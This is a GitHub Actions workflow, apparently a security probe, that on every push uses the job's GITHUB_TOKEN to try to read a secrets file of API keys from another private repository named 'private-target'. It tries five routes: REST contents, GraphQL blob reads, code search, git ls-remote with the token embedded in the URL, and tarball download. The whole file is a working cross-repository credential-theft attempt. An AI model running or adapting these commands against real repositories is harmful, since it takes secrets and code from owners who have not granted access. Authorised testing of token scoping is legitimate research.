name: Cross Read
on: push
jobs:
  read:
    runs-on: ubuntu-latest
    steps:
      - name: Cross-repo access via GITHUB_TOKEN
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "=== API access to private-target ==="
          curl -s -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $GH_TOKEN" \
            "https://api.github.com/repos/e0X1337/private-target/contents/secrets/api-keys.txt"

          echo ""
          echo "=== GraphQL blob read ==="
          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "https://api.github.com/graphql" \
            -d '{"query":"{ repository(owner:\"e0X1337\",name:\"private-target\") { object(expression:\"main:secrets/api-keys.txt\") { ... on Blob { text } } } }"}'

          echo ""
          echo "=== Search API ==="
          curl -s -H "Authorization: Bearer $GH_TOKEN" \
            "https://api.github.com/search/code?q=PRIVATE_API_KEY+user:e0X1337"

          echo ""
          echo "=== Git protocol: try to fetch objects ==="
          GIT_TERMINAL_PROMPT=0 git ls-remote "https://x-access-token:${GH_TOKEN}@github.com/e0X1337/private-target.git" 2>&1 | head -5 || echo "git access denied"

          echo ""
          echo "=== Attempt: Access via archive download ==="
          curl -s -w "\nHTTP:%{http_code}" -L -H "Authorization: Bearer $GH_TOKEN" \
            "https://api.github.com/repos/e0X1337/private-target/tarball/main" -o /dev/null
